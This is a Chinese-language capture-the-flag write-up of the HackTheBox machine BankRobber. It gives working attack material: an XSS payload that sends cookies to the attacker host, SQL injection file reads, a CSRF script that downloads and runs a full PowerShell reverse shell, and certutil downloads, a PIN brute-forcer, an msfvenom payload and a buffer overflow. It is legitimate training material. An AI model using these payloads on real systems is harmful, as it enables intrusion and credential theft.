> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/4by3dCT7X3_JuhVkXtzKqg)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVp5O0qqJ5JEdbeD2rAX4YumAHJOxuZB79WmmzoR9Sg00Jrb1zkTYdibA/640?wx_fmt=png)

靶机信息
----

靶机地址:

```
 https://app.hackthebox.com/machines/BankRobber
```

靶场: HackTheBox.com

靶机名称: BankRobber

难度: 疯狂

提示信息:

```
 无
```

目标: user.txt 和 root.txt

实验环境
----

```
 攻击机:Kali 10.10.16.4
 
 靶机:10.10.10.154
```

信息收集
----

### 扫描端口

扫描靶机开放的服务端口

```
 sudo masscan -p1-65535 -i tun0 10.10.10.154 --max-rate 1000
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVAADMQ1YibLXwPblFY6QJ5bzhaQibBJlgLgdyEhJfaVG5IytFlcMSySwg/640?wx_fmt=png)

```
 sudo nmap -sC -sV -A -p 80,443,445,3306 10.10.10.154 -oN nmap.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXV2EaiaNl0WhLP6D1cUOZyqDyJ0XBkIE2E6dSNSH9aO2fibasPawmvsVRw/640?wx_fmt=png)

主机开放 80(HTTP)、443(HTTP)、445(SMB)、3306(Mysql)，HTTP 环境是 APACHE2.4.39+PHP7.3.4（猜测是 XAMPP），操作系统是 64 位的 Windows，先来看看 445 端口

### SMB 服务

```
 sudo nmap --script smb-vuln* 10.10.10.154 -p 445 -oN nmap-smb-vuln.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVzibKdzBOeKIULfK7RgR8jSe4UFdXTyibbicxZfvcZnJoJgjd21LtslCuA/640?wx_fmt=png)

smb 未发现可利用信息，再来看看 80 和 443 端口

HTTP 信息收集
---------

```
 http://10.10.10.154/
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVLZWicTNG46bMnPyV0E0GOn7MsMPVu3GZdUicOfqEukHNdtsOPN5zf5HA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVvHKELpoicibMuicEr9zw7DggsPKAcSCH3OQkFs8dGib5ibqQ29GDgHicp9lg/640?wx_fmt=png)

访问 80 端口发现目标站点是比特币交易网站，页面最下方有个链接访问后猜测网站是由 WordPress 程序搭建的，站点上有注册功能，注册账号并登录

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVQ2N7ouxQzbia9QwVj4jBACXosPHC3m9yWDXn8ACnb2RaWtoIdZzrLYg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVaEeiaZRVxz2MgLXhSTeUN0VTEUVwmMy7JibXHN0kLDRD6Nr1jxQBhc9A/640?wx_fmt=png)

登录后只有一个交易功能，提交内容后弹出提示，需要管理员查看后才能确定交换（这里是否可以插入 XSS？后台是否是有程序自动访问）先来做个目录扫描

### 目录扫描

```
 dirsearch -u http://10.10.10.154 -e php,zip,tar.gz,bak,txt,html -t 10 --retries 5 -x 403
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVMCibLerh2pZeBsWRyAca1qta07E8FzlXLYl9xUPgwEB1AAFf3nYohIA/640?wx_fmt=png)

换个字典对 HTTPS 扫描

```
dirsearch -u https://10.10.10.154 -e php,zip,tar.gz,bak,txt,html -t 10 --retries 5 -x 403,503 -w ~/HackTools/Dict/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVcjTicwB3fdxFaQDzzKxEcVYd87AWyewTYrWnDMSEGCrHhwzh8icqqIWw/640?wx_fmt=png)

扫描结果中有后台管理页面，访问看看

```
http://10.10.10.154/ADMIN/
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVI06CJMrtwQiaKoxgBbDia9np5O79GBbhLwyTkIsqWmtKibETTbC9ttDnQ/640?wx_fmt=png)

提示没有权限访问，猜测要伪造内网 IP

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVkySkZLZNsSV1wTe1kI4XyuDkaRHS1vicredrelicAHjVcFzia0044l8iaw/640?wx_fmt=png)

就知道没这么简单，继续找

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVyJ34MdDViaL7sjvNT4dmGGVXu4WcQPicGUxkGduolicLoNqED3IkBqUGA/640?wx_fmt=png)

登录后的 cookie 里发现一些敏感信息这里的账号密码看起来是 base64 编码过的，验证一下

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVibFT1Z9oqCB3kMYhW40JTrlHhtZibxFBfWWy792HrA6cEiaFibfnchibCyw/640?wx_fmt=png)

正是刚刚注册时的账号密码，猜测需要 XSS 获取管理员的 cookie

漏洞利用 (Exploitation)
-------------------

### XSS 获取 Cookie

1。攻击机开启 HTTP 服务

```
py3 -m http.server 80
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVGRJOLEvwfgkAdT5DocsicUGaoiaO1NsupnDy82Jicz2F4ia43gkrcibP4VQ/640?wx_fmt=png)

3。提交 payload

功能页面上提交是无效的，因为不会将特殊字符编码。通过 BurpSuite 提交后等的有点久，导致不停的更换 payload 测试，注意 toId 不能超过你的 id，因为不存在的不会进入后台。

```
<img src=x onerror=this.src='http://10.10.16.4/?'+document.cookie;>
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVdUtA2AaFibmHrj1ys30QK44EatPdePBjG7Z6pgicHeMpyZkib6SWSt3Iw/640?wx_fmt=png)

提交后提示等待 1 分钟内管理员查看信息（不要相信他 10 分钟内不返回继续提交），攻击机上观察 HTTP 服务。当管理员查看留言时，会触发 XSS 访问攻击机 HTTP 服务将 cookie 传回来。

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVwSfxxzEiboibKIDEdhNwia9iavlgnqhPXuKbTsotvhYbG4ZUZa1TfdSJxQ/640?wx_fmt=png)

拿到 Cookie 后用 base64 解码 (注意 %3D 是等号)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVt3NLF4Fv0vCvicA98juia1fxI00yKNKGVVI2LcI8LiaDnLGfocYvA8Jzg/640?wx_fmt=png)

解码后账号 admin 密码 Hopelessromantic，登录后台。

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVEnJwNuCKiaJ85RGM76Nic4FUybj2074KLkhSjhItaw9g6Wths3vcT43g/640?wx_fmt=png)

登录后发现有两个功能，Search users 搜索用户和 Backdoorchecker 后门检测。

后门检测功能提示只能使用 dir 命令，但是可以加任意参数，输入 dir 后提示只能在 localhost 执行命令，看来还是有伪造 IP 的地方。

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXV6OJESzcsO4JUhGu3QwHygiaiaKACILEuTMribkfCD2JGnibrJib4s4w133A/640?wx_fmt=png)

搜索用户功能输入 id 可能查询用户名称，输入 1‘后发现存在 SQL 注入漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVGbm21C3QHmStfYficUVcVCBPOc5uBARAqPO37U3BEAbA8XxUG9dggTA/640?wx_fmt=png)

先来验证下 SQL 注入

### SQL 注入

```
1' order by 3-- -
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVvT84SAlia9qLZprqIpklNjTOxD33atYbBajsTO85HCFvE8ESDbiaWH2w/640?wx_fmt=png)

通过 BurpSuite 抓包并手工检测发现表中有 3 列

```
1' union select 4,2,3-- -
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVxxbibAHJFezIPZUbWWkKia74xL7p5YbBp2VjXY1Wj5Kk2d83HPfMibMiaQ/640?wx_fmt=png)

发现两个回显点，再来查询当前用户

```
1' union select 1,user(),3-- -
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVam6IkpxZtAiaxoqA4LbVianAyzD22DDO4WX5QLw8LuvNMc4sEmxsRYww/640?wx_fmt=png)

查询到账号为 root，在前面已经拿到了管理员和账号密码，直接尝试读取文件。

猜测 flag 文件地址为`c:\users\administrator\desktop\root.txt`

```
1' union select 1,load_file('c:\\users\\administrator\\desktop\\root.txt'),3-- -
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVQDRutdohZoPAPNBHRaWl349PPUC1leLV7SrCmY3Jic5ib01Bb08cpAicA/640?wx_fmt=png)

读取失败，猜测是权限不够。再来看看当前目录

```
1' union select 1,@@datadir,3-- -
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVSwkUiaicibOTfPOIHiavveBkicfnBvVwYqrVuABe3l96PnXs6BQEqfo2Dicg/640?wx_fmt=png)

果然是 XAMPP，来读取下站点文件

```
1' union select 1,load_file("c:\\xampp\\htdocs\\index.php"),3-- -
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVuC09ww37JciaQWh0aWadr5OicHaZ8xAdVmuNEwHpLpbhpArYycqAKAOg/640?wx_fmt=png)

源文件被包含到页面中，换 BurpSuite 查看

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXV96sZXpCjkJ0rRvcObLPeTMW297AlIIGfyJ3pRXLcZoGlZ8lKu4Lgqg/640?wx_fmt=png)

再来看看其他文件，

search.php

```
1' union select 1,load_file('c:\\xampp\\htdocs\\admin\\search.php'),3-- -
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVyCfmSfnibHcwbtmicP93JicribOTzakZPYSI9QQyU2qvntwEdEVI5ibb5pg/640?wx_fmt=png)

由于没有做任何过滤导致存在 SQL 注入漏洞，再来看看后门检测功能源码

```
1' union select 1,load_file('c:\\xampp\\htdocs\\admin\\backdoorchecker.php'),3-- -
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVWS69jvMg16I1cowalbtBPtia2kJC9CZ89qicZ45d9Q3nibXatyVYwPibFw/640?wx_fmt=png)

发现两处过滤：1。`$` `,` `(` `&`四个特殊字符不能使用，这里可以使用`|`绕过`&`，2。远程访问 IP 为`::1`才可以执行命令。看来又想简单了，这不是伪造 IP 访问，而是需要 CSRF，来验证下。

### 命令执行

通过 XSS 漏洞执行 javascipt 代码向 backdoorchecker.php 页面，以 POST 方式提交命令引发 csrf 漏洞来执行下载和运行 shell 命令。先来验证

1。准备反弹 shell 脚本

rev.ps1（注意修改最后一行攻击机地址）

```
function Invoke-PowerShellTcp 

{ 

    [CmdletBinding(DefaultParameterSet)] Param(



        [Parameter(Position = 0, Mandatory = $true, ParameterSet)]

        [Parameter(Position = 0, Mandatory = $false, ParameterSet)]

        [String]

        $IPAddress,



        [Parameter(Position = 1, Mandatory = $true, ParameterSet)]

        [Parameter(Position = 1, Mandatory = $true, ParameterSet)]

        [Int]

        $Port,



        [Parameter(ParameterSet)]

        [Switch]

        $Reverse,



        [Parameter(ParameterSet)]

        [Switch]

        $Bind



    )



    try 

    {

        #Connect back if the reverse switch is used.

        if ($Reverse)

        {

            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)

        }



        #Bind to the provided port if Bind switch is used.

        if ($Bind)

        {

            $listener = [System.Net.Sockets.TcpListener]$Port

            $listener.start()    

            $client = $listener.AcceptTcpClient()

        } 



        $stream = $client.GetStream()

        [byte[]]$bytes = 0..65535|%{0}



        #Send back current username and computername

        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")

        $stream.Write($sendbytes,0,$sendbytes.Length)



        #Show an interactive PowerShell prompt

        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')

        $stream.Write($sendbytes,0,$sendbytes.Length)



        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)

        {

            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding

            $data = $EncodedText.GetString($bytes,0, $i)

            try

            {

                #Execute the command on the target.

                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )

            }

            catch

            {

                Write-Warning "Something went wrong with execution of command on the target." 

                Write-Error $_

            }

            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '

            $x = ($error[0] | Out-String)

            $error.clear()

            $sendback2 = $sendback2 + $x



            #Return the results

            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)

            $stream.Write($sendbyte,0,$sendbyte.Length)

            $stream.Flush()  

        }

        $client.Close()

        if ($listener)

        {

            $listener.Stop()

        }

    }

    catch

    {

        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 

        Write-Error $_

    }

}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.4 -Port 4444
```

2。攻击机在 rev.ps1 目录下开启 HTTP 服务，并使用 NC 监听 4444 端口

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVS7iaMfEnm5S3CHmoyDytlvxxZHtHTs0NbBiauoAhicqeEw9NPPvvYFjYQ/640?wx_fmt=png)

3。发送 payload

```
<script>
var xmlhttp=new XMLHttpRequest();
var params = 'cmd=dir|powershell -c "iex (New-Object Net.WebClient).DownloadString(\'http://10.10.16.4/rev.ps1\')"';
xmlhttp.open("POST","http://localhost/admin/backdoorchecker.php",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send(params);
</script>
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVibAwbTqngAB8jU8sSYGg21h1Z04OqibIkdNSbpKU1dkDxz9zXTuQ1Jlw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVuiaianEsJ1tFuX6B4opkxeria9VMhxozApb7RlzPj4SjWSia7IuNicTraEw/640?wx_fmt=png)

反弹成功，拿到用户 cortin 权限，来找找敏感信息

```
cd \users
type cortin\desktop
type cortin\desktop\user.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXV5pw4w1n3ALunPuwj4MOzjFNLXiaUJp4KASluJxlYxHZFTVEibqicWb2jQ/640?wx_fmt=png)

拿到用户 flag，再来看看如何提权

```
systeminfo
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVibmWlNOSCXhkV88OgPUNGUfWI8px4nsHDwZklrZ65jFzuNGGVB4NkZQ/640?wx_fmt=png)

通过 systeminfo 命令发现靶机为 64 位 win10，14393 版本未打过任何补丁，上传 winPEAS 检查存在哪些漏洞

提权 (Privilege Escalation)
-------------------------

1。在 winpeas 目录下开启 HTTP 服务

```
py3 -m http.server
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVVt6P7gurZIj8QibPLpubzbmictGOFx6iaDmlRZbEDBCc3bCWIGsXkNMPQ/640?wx_fmt=png)

2。攻击机下载 winpeas 并执行

```
cd \
mkdir temp
cd temp
certutil -urlcache -split -f http://10.10.16.4:8000/winPEASx64.exe
.\winPEASx64.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVpBnE4gYs0ozcI9CqjxrciaVjthNIdqniawXp6JvrEmBKfJShGl5oaaSw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVTkx0787kV2ZSialj1dSfrWeiaQnDK83tE6icaLNmKoiccW71BbJaIeF4fw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVcbg0XuicjicE6SpGPkkDYj1BLe1wkSDvvWTmmqhZHVjjw2WrJRAMUsBw/640?wx_fmt=png)

winpeas 找到 9 个可以利用的漏洞，TCP 端口中发现一个 bankv2 的程序开启了 910 端口，这个 bank 和靶机名字有关系，猜测这里可以获取到一些信息，但是 910 端口限制了访问，需要将端口映射出来

### 隧道搭建

chisel 仓库

```
https://github.com/jpillora/chisel
```

1。攻击机上启动 server 模式监听 9999 端口并允许反向隧道

```
chisel server -p 9999 --reverse
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVjJVZQx9QLEQPoq7UHsRUYAyV9JMhGcu1Uaic3Cm8N5KFBlGhFPDCadg/640?wx_fmt=png)

2。将 chisel 上传到靶机

攻击机上 chisel 目录下开启 HTTP 服务，靶机下载 chisel

```
certutil -urlcache -split -f http://10.10.16.4:8000/chisel.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVbf5AxIqKz0w9HWEUP87DftW4YGAuw1h1uVMcliaMN5r6Y7vjjiavZEhg/640?wx_fmt=png)

3。靶机开启 client 模式并将 910 端口转发到攻击机上

```
.\chisel.exe client 10.10.16.4:9999 R:910:localhost:910
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVXciciaMgm6RmmUuXxbsmfUakJPR8xSk0NumMD9YUhZdmYkwa7I0YDxMQ/640?wx_fmt=png)

连接成功，可以在攻击机上检查

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXV5t3bMnVtlFibVK39ujDbzVM3L1eBV7tCNlVPH8zeKT2hIxQGBBMtCAA/640?wx_fmt=png)

隧道搭建好开始访问 910 端口

```
nc 127.0.0.1 910
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVJoTu8WLSUbjuryg9C2hn8dicLtW4OBLQXplzD2Izf97DgnsuYq9eOgw/640?wx_fmt=png)

连接后提示输入 4 位 PIN 码登录，写个脚本来暴破 PIN 码

bankv2Crack.py

```
import socket
import sys

for i in range(10000):
    sys.stdout.write(f"\rTest PIN: {i:04d}")
    socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socks.connect(('127.0.0.1', 910))
    socks.recv(1024)
    socks.send(f"{i:04d}\n".encode())
    socksresp = socks.recv(1024)
    if not b"Access denied, disconnecting client" in socksresp:
        print(f"\rGood PIN: {i:04d}")
        socks.close()
        break
    socks.close()
```

```
py3 bankv2Crack.py
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVbMeR97nQIWyHfJIr3kZXIEFtic9D7fdaNiakonh3SI5jApxDGrup89Vg/640?wx_fmt=png)

拿到 PIN 码为 0021，再来试试

```
nc 127.0.0.1 910
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVv9I6ex0NdFBqAnAEFWaa4riaFJD5iaxAcia3mZaqicONF3vuoU6BtYDjLQ/640?wx_fmt=png)

提示输入转移电子货币的金额

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVGujw6qEUnQ9fgiaDsDHFjdy4YbVEFASdicssoSPDjlw3cfCU9xc1W5Vg/640?wx_fmt=png)

随便输入个数字后提示正在运行另一个程序来传输电子货币，再来试试

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVGfkngdZenIYiccgRYEWSU1dNic9kLhMp0Q4fapnUibUIS41oQt6BfKeDQ/640?wx_fmt=png)

当输入长字符串时，电子货币传输工具被覆盖了，猜测此处存在溢出漏洞。继续测试

生成 50 位随机字符串提交

```
msf-pattern_create -l 50
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVqaIKujYPgeIGxtL8rdmfvBNzTXr5JGsGSibjNKHTIdBSAguMO9PibpSw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVbdFYloiciaD3wQ9PX8sqGYQibsfKdicgnKwHwIhXZl5SzKIIZDgoX83oqA/640?wx_fmt=png)

提交 50 位的字符串多出来 18 位，那么只需要提交 32 位的字符串再加上 sehll 路径即可溢出，先来生成个 shell 并上传到靶机

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=3333 -f exe > shell.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVozQXQs1rJvxMGhh9mjz2Ric6clp9YHkXEzFFS3WZoDhy04ic1gDYj53w/640?wx_fmt=png)

上传 shell 需要先关闭隧道然后重新执行 XSS 漏洞反弹 shell 到攻击机（或者另外监听端口执行 XSS 攻击也可以）

```
msf-pattern_create -l 32
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVn0RXjh1ENJZicugLsl8nT5oxnbZdWnsVk5eiclSNvMdm56UgnN87c9mw/640?wx_fmt=png)

使用 msf 监听 3333 端口

```
msfconsole -q
use exploit/mulit/handler
use pyaload/windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.16.4
set LPORT 3333
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXV4w5kqsnU5SY96rw1khE7eTKklmYX11tzvnpgPd1e8EUuEg1CvYCucQ/640?wx_fmt=png)

上传 shell.exe

```
certutil -urlcache -split -f http://10.10.16.4:8000/shell.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVn4jUJbH6oTS7b5LqoWiabw0u5tThx6tJKocNXNhJCNE5AsVq14U2vxQ/640?wx_fmt=png)

重新连接隧道

```
.\chisel.exe client 10.10.16.4:9999 R:910:localhost:910
```

一切准备完毕，开始攻击

构造 payload

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9AbC:\\temp\\shell.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVyQJbKYeVWqddb0L2G8nqDWaUDtRpMjDSXsmAuRCL4ezEd3RibPHZ6Dg/640?wx_fmt=png)

成功溢出执行命令，并且拿到 SYSTEM 权限，来找下 flag

```
shell
cd c:\users\admin\desktop
type root.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVarx9SNKicFNQNvxeTAKKtuOFhVEtLQnBWTF2clM3MKia8GEvATj0Q6BQ/640?wx_fmt=png)

拿到 root.txt，游戏结束。这台靶机知识点非常多 XSS、SQL 注入、CSRF、隧道、缓冲区溢出、密码暴破，虽然内容多，但多数是基础的东西，喜欢这台靶机有机会可以录个视频。

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVwX1AOg9enjWXds0q7pUxhcPShUWjSlofJaB83ibs8TkBG5RZksOIGqA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXVdMMOibPf6uMuC57XnibxyPyzUUOxmXEbxcgqkSibDq1t2fagvGvNG7vwA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/7gUQD4TbLUu4ZtppS31zrQOLhlv7sbXV7UpTzaSPM51IK9FNmZ7AN8uZzv5u1KypH3bPvTbutIaBIuK8ibxKfpw/640?wx_fmt=jpeg)